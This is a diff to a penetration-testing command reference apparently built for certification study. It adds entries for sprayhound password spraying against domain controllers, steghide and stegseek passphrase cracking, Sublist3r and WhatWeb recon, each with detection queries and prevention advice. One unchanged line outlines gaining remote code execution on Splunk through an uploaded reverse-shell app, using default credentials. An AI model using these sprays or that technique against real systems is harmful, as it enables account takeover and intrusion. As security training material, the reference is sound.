+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "PlumHound only queries a neo4j database already built from AD collection data. It performs no new domain activity - the detectable activity is the upstream SharpHound/bloodhound-python collection.",
+        "prerequisites": "Populated BloodHound neo4j database.",
+        "impact": "Rapid identification of all privilege-escalation paths and misconfigurations in the domain.",
+        "detection": "[MITRE T1069.002] No direct AD detection (offline graph queries). Detect the upstream collection: heavy LDAP/SAMR enumeration, SharpHound signatures.",
+        "artifacts": "neo4j query logs on the attacker/analyst host; upstream collection artifacts on the DC.",
+        "splunk_spl": "index=windows EventCode=4662 ObjectType=\"*\" \n| stats count by SubjectUserName, ObjectName\n| where count > 100",
+        "elastic_kql": "event.code:4662 and winlog.event_data.AccessMask:*",
+        "sentinel_kql": "IdentityQueryEvents\n| summarize Queries=count() by AccountName, bin(Timestamp, 5m)\n| where Queries > 200",
+        "sigma_rules": "win_security_bloodhound_collection",
+        "prevention": "Reduce ACL attack surface (tier model, LAPS, remove dangerous ACEs); the report output is a remediation to-do list - action it. Detect SharpHound collection upstream.",
+        "sources": [
+          "PlumHound docs",
+          "https://attack.mitre.org/techniques/T1069/002/"
+        ]
+      }
     },
     {
       "type": "command",
@@ -148105,6 +148679,104 @@ const COMMAND_DATA = {
       "explain": "Splunk runs scripted inputs from installed apps.\nPackage an app whose inputs.conf runs a reverse-shell script (rev.py/run.ps1), upload it, and Splunk executes it - RCE as the Splunk user.\nDefault creds admin:changeme."
     },
     {
+      "id": "ad-sprayhound",
+      "name": "Sprayhound - Password Spray with BloodHound Marking",
+      "command": "sprayhound -U <userlist> -d <domain> -dc <dc_ip> -p <password>",
+      "description": "Sprayhound performs domain password spraying while respecting the account lockout policy (auto-fetches badPwdCount before each attempt to avoid locking users). On a successful spray it can mark owned users as owned directly in a BloodHound neo4j database, immediately updating attack paths. Combines safe spraying with graph enrichment.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "Password Attacks",
+      "certifications": [
+        "CPTS",
+        "OSCP"
+      ],
+      "primary_cert": "CPTS",
+      "source": "Hackndo/sprayhound",
+      "tags": [
+        "sprayhound",
+        "password-spray",
+        "bloodhound",
+        "lockout",
+        "badpwdcount",
+        "neo4j"
+      ],
+      "mitre": [
+        "T1110.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== SAFE SPRAY (lockout-aware) ===\n  sprayhound -U users.txt -d <domain> -dc <dc_ip> -p Spring2024!\n  # Reads badPwdCount per user, skips anyone near the lockout threshold\n\n=== SPRAY + MARK OWNED IN BLOODHOUND ===\n  sprayhound -U users.txt -d <domain> -dc <dc_ip> -p Spring2024! \\\n    -nh <neo4j_host> -nu neo4j -np bloodhound\n  # Owned users are flagged owned=true in the graph\n\n=== LOW-AND-SLOW SINGLE PASSWORD ===\n  sprayhound -U users.txt -d <domain> -dc <dc_ip> -p Welcome1\n\n=== GET LOCKOUT THRESHOLD FIRST ===\n  crackmapexec smb <dc_ip> -u <user> -p <password> --pass-pol\n  # Keep attempts below (threshold - 1); sprayhound enforces this automatically\n\n=== ALTERNATIVES ===\n  kerbrute passwordspray  # Kerberos pre-auth, no lockout count check\n  crackmapexec smb --no-bruteforce  # manual spray\n  DomainPasswordSpray.ps1  # on-host Windows spray",
+      "examples": [
+        {
+          "label": "Lockout-aware spray",
+          "command": "sprayhound -U users.txt -d corp.local -dc 10.10.10.5 -p Spring2024!"
+        },
+        {
+          "label": "Spray and mark owned in BloodHound",
+          "command": "sprayhound -U users.txt -d corp.local -dc 10.10.10.5 -p Spring2024! -nh 127.0.0.1 -nu neo4j -np bloodhound"
+        }
+      ],
+      "references": [
+        {
+          "title": "sprayhound",
+          "url": "https://github.com/Hackndo/sprayhound"
+        },
+        {
+          "title": "MITRE T1110.003 - Password Spraying",
+          "url": "https://attack.mitre.org/techniques/T1110/003/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-kerbrute-spray",
+          "note": "Kerbrute sprays via Kerberos pre-auth (no SMB lockout visibility).",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-bloodhound-ce",
+          "note": "BloodHound consumes the owned markings to recompute paths.",
+          "rel": "next"
+        },
+        {
+          "id": "ad-cme-spray",
+          "note": "CrackMapExec is the manual spray alternative.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "A single common password tried against many accounts stays under per-account lockout thresholds. Sprayhound reads badPwdCount via LDAP to avoid locking accounts, making the spray stealthier.",
+        "prerequisites": "Valid low-priv domain account (to read badPwdCount); network access to the DC; a user list.",
+        "impact": "Account compromise without triggering lockouts; immediate BloodHound path enrichment.",
+        "detection": "[MITRE T1110.003] Many 4625 failed logons across distinct accounts from one source in a short window; LDAP reads of badPwdCount across many users; 4771 Kerberos pre-auth failures.",
+        "artifacts": "Spike in 4625/4768/4771 events with the same source IP and varying TargetUserName; LDAP queries enumerating badPwdCount.",
+        "splunk_spl": "index=windows EventCode=4625\n| bin _time span=10m\n| stats dc(TargetUserName) as users count by _time, IpAddress\n| where users > 10",
+        "elastic_kql": "event.code:4625 and winlog.event_data.IpAddress:*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 4625\n| summarize Accounts=dcount(TargetUserName), Attempts=count() by IpAddress, bin(TimeGenerated, 10m)\n| where Accounts > 10",
+        "sigma_rules": "win_security_password_spraying",
+        "prevention": "Enforce account lockout policy; require MFA; deploy smart lockout (Entra); monitor badPwdCount reads; ban common/seasonal passwords.",
+        "sources": [
+          "Hackndo",
+          "https://attack.mitre.org/techniques/T1110/003/"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "Password spraying - many accounts from single source",
+            "logic": "index=windows EventCode=4625\n| bin _time span=10m\n| stats dc(TargetUserName) as unique_users values(TargetUserName) as users by _time, IpAddress\n| where unique_users > 10",
+            "data_source": "windows-security",
+            "attack": [
+              "T1110.003"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Vulnerability scanners, misconfigured service accounts, login portals",
+            "tuning": "Baseline normal 4625 volume per source; exclude known scanners"
+          }
+        ]
+      }
+    },
+    {
       "id": "sql-enumerate",
       "name": "SQL - Enumerate Databases and Tables",
       "command": "SELECT name FROM master.dbo.sysdatabases",
@@ -159945,6 +160617,168 @@ const COMMAND_DATA = {
       ]
     },
     {
+      "id": "stego-steghide",
+      "name": "steghide - Hide/Extract Data in Images and Audio",
+      "command": "steghide extract -sf <file>",
+      "description": "steghide embeds and extracts hidden data in JPEG, BMP, WAV, and AU files, optionally passphrase-protected. Common in CTF and occasionally in real loot (exfil via images). Extraction requires the passphrase, which is often blank, a known word, or crackable with stegseek.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Password Attacks",
+      "subcategory": "Steganography",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "steghide project",
+      "tags": [
+        "steghide",
+        "steganography",
+        "jpeg",
+        "wav",
+        "hidden-data",
+        "ctf"
+      ],
+      "mitre": [
+        "T1027.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== EXTRACT (try blank passphrase first) ===\n  steghide extract -sf image.jpg\n  # When prompted for passphrase, press Enter (blank) first\n\n=== EXTRACT WITH KNOWN PASSPHRASE ===\n  steghide extract -sf image.jpg -p \"<password>\"\n\n=== CHECK IF DATA IS PRESENT / INFO ===\n  steghide info image.jpg\n\n=== EMBED DATA ===\n  steghide embed -cf cover.jpg -ef secret.txt -p \"<password>\"\n\n=== CRACK THE PASSPHRASE (fast) ===\n  stegseek image.jpg /usr/share/wordlists/rockyou.txt\n  # stegseek is ~1000x faster than stegcracker\n\n=== SUPPORTED CARRIERS ===\n  JPEG, BMP, WAV, AU  (NOT PNG/GIF - use zsteg/other for those)\n\n=== TRIAGE WORKFLOW FOR AN IMAGE ===\n  file image.jpg               # confirm type\n  exiftool image.jpg           # metadata/comments\n  strings image.jpg | less     # embedded text\n  binwalk image.jpg            # appended archives\n  steghide info image.jpg      # steghide payload\n  stegseek image.jpg rockyou.txt  # crack passphrase\n  zsteg image.png              # for PNG/BMP LSB",
+      "examples": [
+        {
+          "label": "Extract (blank passphrase)",
+          "command": "steghide extract -sf image.jpg"
+        },
+        {
+          "label": "Extract with passphrase",
+          "command": "steghide extract -sf image.jpg -p \"s3cret\""
+        },
+        {
+          "label": "Crack passphrase with stegseek",
+          "command": "stegseek image.jpg /usr/share/wordlists/rockyou.txt"
+        }
+      ],
+      "references": [
+        {
+          "title": "steghide",
+          "url": "https://steghide.sourceforge.net/"
+        },
+        {
+          "title": "MITRE T1027.003 - Steganography",
+          "url": "https://attack.mitre.org/techniques/T1027/003/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "stego-stegseek",
+          "note": "Crack the steghide passphrase at high speed.",
+          "rel": "next"
+        },
+        {
+          "id": "crack-fcrackzip",
+          "note": "Hidden archives also show up in challenges.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Steganography hides data inside carrier files that look benign. Detection is hard without the original cover file or statistical steganalysis; it is primarily an offline/CTF technique.",
+        "prerequisites": "Possession of the carrier file; passphrase (or crack it).",
+        "impact": "Concealed data extraction / covert exfiltration channel.",
+        "detection": "[MITRE T1027.003] Hard to detect in transit. Statistical steganalysis (chi-square, stegdetect) on images; anomalous file size vs. content; outbound images to unusual destinations.",
+        "artifacts": "Carrier files with abnormal entropy/size; steghide present on a host; unusual image exfil.",
+        "splunk_spl": "N/A - primarily offline; monitor large/anomalous image egress at the proxy",
+        "elastic_kql": "file.extension:(jpg OR jpeg OR wav) and file.size > 5000000",
+        "sentinel_kql": "DeviceFileEvents\n| where FileName endswith \".jpg\" or FileName endswith \".wav\"\n| where FileSize > 5000000\n| project Timestamp, DeviceName, FileName, FileSize",
+        "sigma_rules": "steganography_tool_execution",
+        "prevention": "DLP with steganalysis; block/monitor steganography tools on endpoints; inspect anomalous media egress; strip metadata and re-encode media at trust boundaries.",
+        "sources": [
+          "steghide docs",
+          "https://attack.mitre.org/techniques/T1027/003/"
+        ]
+      }
+    },
+    {
+      "id": "stego-stegseek",
+      "name": "stegseek - Fast steghide Passphrase Cracker",
+      "command": "stegseek <file> <wordlist>",
+      "description": "stegseek brute-forces steghide passphrases extremely fast (millions of candidates/sec, ~1000x faster than stegcracker) and auto-extracts the hidden payload on success. It can also detect and recover data without a wordlist in some cases. The go-to tool when a steghide-protected file needs its passphrase broken.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Password Attacks",
+      "subcategory": "Steganography",
+      "certifications": [
+        "OSCP"
+      ],
+      "primary_cert": "OSCP",
+      "source": "RickdeJager/stegseek",
+      "tags": [
+        "stegseek",
+        "steganography",
+        "steghide",
+        "passphrase-cracking",
+        "ctf"
+      ],
+      "mitre": [
+        "T1027.003",
+        "T1110.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CRACK + AUTO-EXTRACT ===\n  stegseek image.jpg /usr/share/wordlists/rockyou.txt\n  # On success writes image.jpg.out with the hidden payload\n\n=== SPECIFY OUTPUT FILE ===\n  stegseek image.jpg rockyou.txt secret.txt\n\n=== SEED/NO-WORDLIST CRACK (empty passphrase payloads) ===\n  stegseek --seed image.jpg\n\n=== JUST CHECK FOR A PAYLOAD ===\n  stegseek --info image.jpg\n\n=== WHEN TO USE ===\n  # After steghide info suggests a payload but the passphrase is unknown\n  # Much faster than stegcracker (deprecated) or manual steghide loops\n\n=== FULL IMAGE TRIAGE ===\n  exiftool image.jpg\n  strings -n 8 image.jpg\n  binwalk -e image.jpg\n  steghide info image.jpg\n  stegseek image.jpg rockyou.txt",
+      "examples": [
+        {
+          "label": "Crack and auto-extract",
+          "command": "stegseek image.jpg /usr/share/wordlists/rockyou.txt"
+        },
+        {
+          "label": "Specify output file",
+          "command": "stegseek image.jpg rockyou.txt loot.txt"
+        },
+        {
+          "label": "Check for payload",
+          "command": "stegseek --info image.jpg"
+        }
+      ],
+      "references": [
+        {
+          "title": "stegseek",
+          "url": "https://github.com/RickdeJager/stegseek"
+        },
+        {
+          "title": "MITRE T1027.003 - Steganography",
+          "url": "https://attack.mitre.org/techniques/T1027/003/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "stego-steghide",
+          "note": "steghide embeds/extracts the data stegseek unlocks.",
+          "rel": "prereq"
+        },
+        {
+          "id": "hashcat-dictionary",
+          "note": "General hash/passphrase cracking workflow.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "steghide passphrase verification is fast to test offline, and stegseek exploits that to try huge wordlists quickly. Weak/common passphrases fall instantly.",
+        "prerequisites": "The steghide carrier file; a wordlist.",
+        "impact": "Recovery of hidden payloads protected by weak passphrases.",
+        "detection": "Offline attacker-side activity - not detectable on the target.",
+        "artifacts": "stegseek on the attacker host; .out payload files.",
+        "splunk_spl": "N/A - offline attacker-side cracking",
+        "elastic_kql": "N/A - offline attacker-side cracking",
+        "sentinel_kql": "N/A - offline attacker-side cracking",
+        "sigma_rules": "N/A",
+        "prevention": "Use strong, unique passphrases for any steganographic payloads; DLP/steganalysis to catch the carrier before it matters; this is mainly a CTF/offline concern.",
+        "sources": [
+          "stegseek",
+          "https://attack.mitre.org/techniques/T1027/003/"
+        ]
+      }
+    },
+    {
       "id": "cdsa-m11-js-encoding",
       "name": "String Encoding & Decoding — Base64, Hex, ROT13 & Cipher Identification",
       "command": "echo 'ZG8gdGhlIGV4ZXJjaXNlLCBkb24ndCBjb3B5IGFuZCBwYXN0ZSA7KQo=' | base64 -d",
@@ -160242,6 +161076,93 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Brute-forces subdomains by resolving a wordlist against the domain with dnsenum:\n  --enum <domain>   enumeration mode against this domain\n  -f <wordlist>     candidate subdomain names to try\n  -r                recurse into subdomains it discovers\nResolves each guess and reports the ones that exist; amass, subfinder, and puredns cover the same ground with different data sources."
+    },
+    {
+      "id": "recon-sublist3r",
+      "name": "Sublist3r - Passive Subdomain Enumeration",
+      "command": "sublist3r -d <domain>",
+      "description": "Sublist3r enumerates subdomains using OSINT sources (search engines, VirusTotal, DNSdumpster, Netcraft, ThreatCrowd, etc.) and optional brute force. Fast first-pass subdomain discovery that requires no direct contact with the target during the passive phase, feeding into live-host probing and content discovery.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "silent",
+      "category": "Information Gathering",
+      "subcategory": "Web Recon",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "aboul3la/Sublist3r",
+      "tags": [
+        "sublist3r",
+        "subdomains",
+        "osint",
+        "passive-recon",
+        "dns"
+      ],
+      "mitre": [
+        "T1590.002",
+        "T1595.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC (passive OSINT) ===\n  sublist3r -d <domain>\n  # Save results:\n  sublist3r -d <domain> -o subdomains.txt\n\n=== WITH BRUTE FORCE (subbrute) ===\n  sublist3r -d <domain> -b\n\n=== LIMIT TO SPECIFIC ENGINES ===\n  sublist3r -d <domain> -e google,bing,virustotal\n\n=== SCAN FOUND SUBDOMAINS FOR OPEN PORTS ===\n  sublist3r -d <domain> -p 80,443\n\n=== TYPICAL PIPELINE ===\n  sublist3r -d <domain> -o subs.txt\n  cat subs.txt | httpx -silent | nuclei\n\n=== ALTERNATIVES / COMPLEMENTS ===\n  subfinder  # faster, more sources, actively maintained\n  amass enum # most thorough, active+passive\n  assetfinder\n  # Run several and merge/sort -u for best coverage",
+      "examples": [
+        {
+          "label": "Passive subdomain enum",
+          "command": "sublist3r -d example.com -o subdomains.txt"
+        },
+        {
+          "label": "With brute force",
+          "command": "sublist3r -d example.com -b"
+        },
+        {
+          "label": "Specific engines only",
+          "command": "sublist3r -d example.com -e google,bing,virustotal"
+        }
+      ],
+      "references": [
+        {
+          "title": "Sublist3r",
+          "url": "https://github.com/aboul3la/Sublist3r"
+        },
+        {
+          "title": "MITRE T1590.002 - DNS",
+          "url": "https://attack.mitre.org/techniques/T1590/002/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "subfinder-enum",
+          "note": "subfinder is faster with more sources.",
+          "rel": "alternative"
+        },
+        {
+          "id": "recon-amass-subdomains",
+          "note": "Amass for the most thorough active+passive enum.",
+          "rel": "alternative"
+        },
+        {
+          "id": "recon-httprobe",
+          "note": "Probe which discovered subdomains are live.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Passive enumeration queries third-party OSINT sources (CT logs, search engines, passive DNS), so the target sees little or no direct traffic. Brute-force mode does query the target resolver.",
+        "prerequisites": "Target domain name; internet access.",
+        "impact": "Maps the external DNS attack surface, revealing forgotten/dev/staging hosts.",
+        "detection": "[MITRE T1590.002] Passive phase is largely undetectable by the target. Brute-force mode causes many NXDOMAIN lookups against authoritative DNS from one resolver.",
+        "artifacts": "Authoritative DNS logs showing bursts of random subdomain queries (brute mode only); CT-log monitoring reveals attacker interest only indirectly.",
+        "splunk_spl": "index=dns record_type=A\n| stats count as queries dc(query) as unique by src_ip\n| where unique > 500",
+        "elastic_kql": "dns.question.type:A and dns.response_code:NXDOMAIN",
+        "sentinel_kql": "DnsEvents\n| where Name endswith \"example.com\"\n| summarize Unique=dcount(Name) by ClientIP, bin(TimeGenerated, 10m)\n| where Unique > 500",
+        "sigma_rules": "dns_subdomain_bruteforce",
+        "prevention": "Minimize public DNS records; monitor certificate transparency logs for your domains; decommission stale hosts; use wildcard DNS cautiously; split-horizon DNS for internal names.",
+        "sources": [
+          "Sublist3r",
+          "https://attack.mitre.org/techniques/T1590/002/"
+        ]
+      }
     },
     {
       "type": "command",
@@ -175845,6 +176766,93 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "recon-whatweb",
+      "name": "WhatWeb - Web Technology Fingerprinting",
+      "command": "whatweb <url>",
+      "description": "WhatWeb identifies web technologies: CMS (WordPress, Joomla, Drupal), frameworks, JavaScript libraries, web servers, analytics, and versions. Uses 1800+ plugins to fingerprint a target from headers, cookies, HTML, and behavior. First step to map a web app to known exploits and the right attack tooling.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Information Gathering",
+      "subcategory": "Web Recon",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "urbanadventurer/WhatWeb",
+      "tags": [
+        "whatweb",
+        "fingerprinting",
+        "cms",
+        "web-recon",
+        "technology-detection"
+      ],
+      "mitre": [
+        "T1595.002",
+        "T1592.002"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== BASIC SCAN ===\n  whatweb <url>\n  whatweb http://<ip>\n\n=== AGGRESSION LEVELS ===\n  whatweb -a 1 <url>   # stealthy (one request)\n  whatweb -a 3 <url>   # aggressive (more plugins, more requests)\n  whatweb -a 4 <url>   # heavy (all plugins)\n\n=== SCAN MANY TARGETS ===\n  whatweb -i live_hosts.txt\n  whatweb <cidr>       # e.g. 10.10.10.0/24\n\n=== VERBOSE + LOG ===\n  whatweb -v <url>\n  whatweb <url> --log-brief=whatweb.txt\n  whatweb <url> --log-json=whatweb.json\n\n=== TYPICAL USE ===\n  # Identify CMS -> pick targeted tool:\n  #   WordPress -> wpscan\n  #   Joomla    -> joomscan\n  #   Drupal    -> droopescan / drupalgeddon\n\n=== ALTERNATIVES ===\n  wappalyzer (browser/CLI)\n  nuclei -t technologies\n  nmap --script http-* ",
+      "examples": [
+        {
+          "label": "Fingerprint a site",
+          "command": "whatweb http://10.10.10.10"
+        },
+        {
+          "label": "Aggressive scan",
+          "command": "whatweb -a 3 -v http://target.local"
+        },
+        {
+          "label": "Scan a host list to JSON",
+          "command": "whatweb -i live_hosts.txt --log-json=whatweb.json"
+        }
+      ],
+      "references": [
+        {
+          "title": "WhatWeb",
+          "url": "https://github.com/urbanadventurer/WhatWeb"
+        },
+        {
+          "title": "MITRE T1595.002",
+          "url": "https://attack.mitre.org/techniques/T1595/002/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "recon-httprobe",
+          "note": "Probe live hosts before fingerprinting them.",
+          "rel": "prereq"
+        },
+        {
+          "id": "nuclei-vuln-scan",
+          "note": "After identifying tech, scan for matching CVEs.",
+          "rel": "next"
+        },
+        {
+          "id": "wafw00f",
+          "note": "Identify the WAF in front of the app.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Fingerprinting infers technologies from normal HTTP responses (headers, cookies, body markers). At low aggression it is a handful of ordinary requests, hard to distinguish from a real browser.",
+        "prerequisites": "A reachable web URL.",
+        "impact": "Maps the app to known-vulnerable components and the right exploit tooling.",
+        "detection": "[MITRE T1595.002] Default WhatWeb User-Agent; requests to fingerprinting paths (/wp-login.php, /administrator, favicon hashes); higher aggression causes bursts of plugin probe requests.",
+        "artifacts": "Web logs with WhatWeb UA; sequential requests to CMS-specific paths.",
+        "splunk_spl": "index=web http_user_agent=\"*WhatWeb*\"\n| stats count by src_ip, uri_path",
+        "elastic_kql": "user_agent.original:*WhatWeb*",
+        "sentinel_kql": "_Im_WebSession\n| where HttpUserAgentOriginal has \"WhatWeb\"\n| project TimeGenerated, SrcIpAddr, Url, HttpUserAgentOriginal",
+        "sigma_rules": "web_recon_whatweb_useragent",
+        "prevention": "Suppress version banners (Server/X-Powered-By headers); generic error pages; WAF to flag scanner UAs; keep components patched so fingerprinting yields no easy wins.",
+        "sources": [
+          "WhatWeb docs",
+          "https://attack.mitre.org/techniques/T1595/002/"
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -189470,8 +190478,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1055,
-  "buildDate": "2026-11-11T04:58:57.907Z",
+  "totalCommands": 1066,
+  "buildDate": "2026-11-11T05:11:49.964Z",
   "certifications": [
     "CDSA",
     "CPTS",
